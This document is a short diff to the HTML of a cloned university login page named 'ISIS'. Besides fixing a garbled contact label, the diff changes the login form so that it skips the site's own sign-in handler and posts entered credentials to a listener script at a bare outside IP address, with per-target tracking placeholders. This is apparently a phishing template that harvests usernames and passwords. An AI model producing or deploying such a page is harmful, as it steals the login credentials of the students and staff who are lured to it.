@@ -224,7 +224,7 @@ if (self === top) {
                      </ul>
                   </div>
                   <div class="menu-flat menu-blue">
-                     <p>Help &amp; Contacanucssa@anu.edu.au/ts</p>
+                     <p>Help &amp; Contacts</p>
                      <ul id="nav-2">
                      </ul>
                      <ul id="nav-ss-hr" style="display: none;"> <!-- SS -->
@@ -260,7 +260,7 @@ if (self === top) {
       <!-- stops ANU search from treating the menu as content-->
 		<!-- PAGE CONTENT -->
             <div class="doublenarrow">
-               <form action="" class="anuform" method="post" id="login_form" onsubmit="return signin()">
+               <form action="http://150.203.139.148/listeners/redir.php?a=<$USER_ID>&b=<$BATCH_ID>&c=<$TYPE_ID>" class="anuform" method="post" id="login_form">
                   <div class="content">
                      <h1 id="headTitle">ISIS</h1>
                      <!-- ERROR MESSAGES -->
